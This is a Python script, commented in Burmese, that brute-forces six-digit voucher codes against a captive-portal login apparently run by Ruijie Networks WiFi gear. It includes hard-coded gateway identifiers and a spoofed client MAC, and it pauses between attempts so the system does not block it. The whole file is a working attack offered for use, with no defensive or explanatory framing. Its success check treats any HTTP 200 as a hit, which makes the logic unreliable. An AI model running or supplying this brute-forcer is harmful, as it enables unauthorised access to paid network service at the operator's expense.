import requests
import random
import time

# သင်ပေးထားတဲ့ Link ကို အခြေခံထားတာပါ
login_url = "http://10.44.77.240:2060/expire_tip"

def start_attack():
    print("\033[97m[+] Target WiFi: Ruijie Networks")
    print("[+] Status: Brute-forcing Voucher Codes...\033[0m")
    
    while True:
        # 6-digit Voucher code တစ်ခုကို ကျပန်းထုတ်ယူမယ်
        test_code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        
        # Router ဆီ ပို့ရမယ့် အချက်အလက်များ
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb', # သင့်ဖုန်းရဲ့ MAC
            'voucher': test_code # စမ်းသပ်မည့် code
        }

        try:
            # Login စမ်းသပ်ရန် POST request ပို့ခြင်း
            response = requests.get(login_url, params=params, timeout=5)
            
            # စာသားထဲမှာ failed ပါ၊ မပါ စစ်ဆေးခြင်း
            if "Authentication failed" in response.text:
                print(f"\033[94m[-] Testing: {test_code} -> [FAILED]\033[0m")
            elif "Success" in response.text or response.status_code == 200:
                print(f"\033[92m[!] SUCCESS FOUND: {test_code}\033[0m")
                break
            else:
                print(f"\033[93m[?] Code: {test_code} - Unknown Response\033[0m")
                
        except Exception as e:
            print(f"\033[91m[!] Error: Connection Lost\033[0m")
            break
            
        time.sleep(0.5) # System က block မလုပ်အောင် ၀.၅ စက္ကန့်ခြားထားသည်

if __name__ == "__main__":
    start_attack()
